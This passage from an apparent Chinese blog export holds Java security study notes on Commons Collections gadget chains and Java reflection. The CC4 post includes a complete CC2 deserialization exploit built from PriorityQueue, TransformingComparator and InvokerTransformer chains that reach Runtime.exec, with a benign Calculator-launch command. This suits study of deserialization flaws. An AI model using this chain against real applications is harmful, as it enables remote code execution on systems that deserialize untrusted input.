<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(property, ComparableComparator.getInstance());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property, Comparator&lt;?&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setProperty(property);</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所有构造无依赖CC的CB1链只需要在构造BeanComparator指定一个java自带的Comparator即可。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVASEC</tag>
      </tags>
  </entry>
  <entry>
    <title>CC4基础知识</title>
    <url>/2023/02/26/CC4%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h2 id="CC4基础知识"><a href="#CC4基础知识" class="headerlink" title="CC4基础知识"></a>CC4基础知识</h2><p>简单整理一下CC4利用链用到的基础知识。</p>
<span id="more"></span>

<h3 id="Comparator"><a href="#Comparator" class="headerlink" title="Comparator"></a>Comparator</h3><p>Comparator是一个接口，用来实现集合中元素的比较、排序.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Comparator</span>&lt;T&gt; &#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue是java自带的的一种数据结构，其自带readObject方法，调用了 <em><strong>heapify()</strong></em> 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();<span class="comment">//调用点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其heapify()中有调用了 <em><strong>siftDown</strong></em> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>当被比较集合不为空时，其siftDown又调用了<strong>siftDownUsingComparator</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>siftDownUsingComparator又调用了，集合的<strong>compare</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其构造函数的参数为<strong>int</strong>和实现<strong>Comparator</strong>接口的的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                         Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">        <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">        <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>TransformingComparator是实现Comparator接口的类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable &#123;</span><br></pre></td></tr></table></figure>
<p>其构造函数接收接口Transformer的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>其compare方法，实现了对transform的调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>有了上述CC4的基础知识，我们就可以构造出CC2这条链。</p>
<hr>
<p>注意: 一开始放的的假的命令执行<strong>transformer</strong>是必须的，因为<strong>PriorityQueue</strong>的<strong>add</strong>方法会调用<strong>offer</strong>，<strong>offer</strong>又会调用<strong>siftUp</strong>方法，<strong>siftUp</strong>又会调用<strong>siftUpUsingComparator</strong>，<strong>siftUpUsingComparator</strong>又会调用<strong>comparator.compare</strong>，导致命令提前执行，并报错。</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/26 21:21</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_PriorityQueue</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="comment">//定义一个命令执行的transformers数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;), <span class="comment">//null相当于空数组</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)&#125;;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerchain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerchain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">4</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(transformerchain, <span class="string">&quot;iTransformers&quot;</span>, transformers);<span class="comment">//需要替换为正确的</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVASEC</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射</title>
    <url>/2023/02/19/Java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h2><p>之前学过反射，半知半解，今天重新学习一下Java反射机制，以及能做的事情。</p>
<span id="more"></span>

<p>下面是反射获取类Test的的源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">5</span>;<span class="comment">//字段1，直接赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;<span class="comment">//字段2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">false</span>);<span class="comment">//字段3，间接赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123; <span class="comment">//构造函数1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(<span class="type">int</span> m, <span class="type">double</span> n)</span> <span class="keyword">throws</span> IOException &#123;<span class="comment">//有参构造函数2</span></span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造函数&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取到int=&quot;</span>+m);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取到double=&quot;</span>+n);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String s)</span> &#123;  <span class="comment">//方法1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;调用hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hello2</span><span class="params">(<span class="type">int</span> x,<span class="type">double</span> y)</span> <span class="keyword">throws</span> IOException &#123;  <span class="comment">//方法2</span></span><br><span class="line">        System.out.println(<span class="string">&quot;获取到int=&quot;</span>+x);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取到double=&quot;</span>+y);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="反射创建对象实例"><a href="#反射创建对象实例" class="headerlink" title="反射创建对象实例"></a>反射创建对象实例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/18 21:44</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_Reflect_getConstructor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ct1</span> <span class="operator">=</span> c.getConstructor();<span class="comment">//不会初始化，无参构造</span></span><br><span class="line">        <span class="type">Test</span> <span class="variable">obj</span> <span class="operator">=</span> (Test)ct1.newInstance();<span class="comment">//初始化执行</span></span><br><span class="line">        obj.hello(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        Class partypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">2</span>];</span><br><span class="line">        partypes[<span class="number">0</span>] = Integer.TYPE;</span><br><span class="line">        partypes[<span class="number">1</span>] = Double.TYPE;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ct2</span> <span class="operator">=</span> c.getConstructor(partypes);<span class="comment">//不会初始化，有参构造</span></span><br><span class="line">        Object arglist[] = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">2</span>];</span><br><span class="line">        arglist[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">37</span>);</span><br><span class="line">        arglist[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">47.0</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> ct2.newInstance(arglist);<span class="comment">//有参生成对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="反射获取类方法"><a href="#反射获取类方法" class="headerlink" title="反射获取类方法"></a>反射获取类方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/18 19:12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_Reflect_methods</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//获取类</span></span><br><span class="line">    Method methods[] = c.getDeclaredMethods();<span class="comment">//获取所有方法</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> methods[i];</span><br><span class="line">        Class pvec[] =m.getParameterTypes();</span><br><span class="line"><span class="comment">//        System.out.println(&quot;类名=&quot; +m.getDeclaringClass());//获取类名</span></span><br><span class="line">        System.out.println(<span class="string">&quot;方法=&quot;</span>+m.getName());<span class="comment">//获取方法名</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">q</span> <span class="operator">=</span> <span class="number">0</span>; q &lt; pvec.length; q++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;参数类型&quot;</span>+pvec[q].getName()); <span class="comment">//获取方法参数</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;返回类型=&quot;</span>+m.getReturnType());<span class="comment">//获取返回类型</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/18 20:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_Reflect_field</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        Field fieldlist[] = c.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fieldlist.length; i++) &#123;</span><br><span class="line">            fieldlist[i].setAccessible(<span class="literal">true</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;字段名=&quot;</span>+fieldlist[i].getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;字段值=&quot;</span>+fieldlist[i].get(c.newInstance()));<span class="comment">//get方法需要传入实例对象</span></span><br><span class="line">            System.out.println(<span class="string">&quot;字段类型=&quot;</span>+fieldlist[i].getType());</span><br><span class="line">            <span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> fieldlist[i].getModifiers();</span><br><span class="line">            System.out.println(<span class="string">&quot;声明类型=&quot;</span>+ Modifier.toString(mod));</span><br><span class="line">            System.out.println(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字段名=h</span><br><span class="line">无参构造函数</span><br><span class="line">字段值=5</span><br><span class="line">字段类型=int</span><br><span class="line">声明类型=public static final</span><br><span class="line">----------------------------</span><br><span class="line">字段名=s</span><br><span class="line">无参构造函数</span><br><span class="line">字段值=test</span><br><span class="line">字段类型=class java.lang.String</span><br><span class="line">声明类型=public</span><br><span class="line">----------------------------</span><br><span class="line">字段名=b</span><br><span class="line">无参构造函数</span><br><span class="line">字段值=false</span><br><span class="line">字段类型=boolean</span><br><span class="line">声明类型=public static final</span><br><span class="line">----------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="修改字段"><a href="#修改字段" class="headerlink" title="修改字段"></a>修改字段</h4><p>反射修改注意如果是static final修饰的，需要先去掉final，再次进行修改，还需要注意，static final修饰的直接赋值还是间接赋值，直接赋值只能通过反射获取修改后的数据（编译优化导致）。间接赋值的可以直接获取修改后的数据。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/2/18 22:03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test_Reflect_Set_field</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        Field field[] = c.getDeclaredFields();</span><br><span class="line">        <span class="type">Test</span> <span class="variable">obj</span> <span class="operator">=</span> (Test) c.newInstance();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; field.length; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;修改前的值&quot;</span>+field[i].getName()+<span class="string">&quot;=&quot;</span>+field[i].get(obj)+<span class="string">&quot; 类型为 &quot;</span>+Modifier.toString(field[i].getModifiers()));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> field[<span class="number">0</span>].getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiers.setInt(field[<span class="number">0</span>], field[<span class="number">0</span>].getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        field[<span class="number">0</span>].set(obj, <span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;反射修改后直接获取&quot;</span>+field[<span class="number">0</span>].getName()+<span class="string">&quot;=&quot;</span>+obj.h);</span><br><span class="line">        System.out.println(<span class="string">&quot;反射修改后反射获取&quot;</span>+field[<span class="number">0</span>].getName()+<span class="string">&quot;=&quot;</span>+field[<span class="number">0</span>].get(obj));</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field[<span class="number">1</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiers.setInt(field[<span class="number">1</span>], field[<span class="number">1</span>].getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        field[<span class="number">1</span>].set(obj, <span class="string">&quot;hack&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;反射修改后直接获取&quot;</span>+field[<span class="number">1</span>].getName()+<span class="string">&quot;=&quot;</span>+obj.s);</span><br><span class="line">        System.out.println(<span class="string">&quot;反射修改后反射获取&quot;</span>+field[<span class="number">1</span>].getName()+<span class="string">&quot;=&quot;</span>+field[<span class="number">1</span>].get(obj));</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field[<span class="number">2</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiers.setInt(field[<span class="number">2</span>], field[<span class="number">2</span>].getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        field[<span class="number">2</span>].set(obj, <span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;反射修改后直接获取&quot;</span>+field[<span class="number">2</span>].getName()+<span class="string">&quot;=&quot;</span>+obj.b);</span><br><span class="line">        System.out.println(<span class="string">&quot;反射修改后反射获取&quot;</span>+field[<span class="number">2</span>].getName()+<span class="string">&quot;=&quot;</span>+field[<span class="number">2</span>].get(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
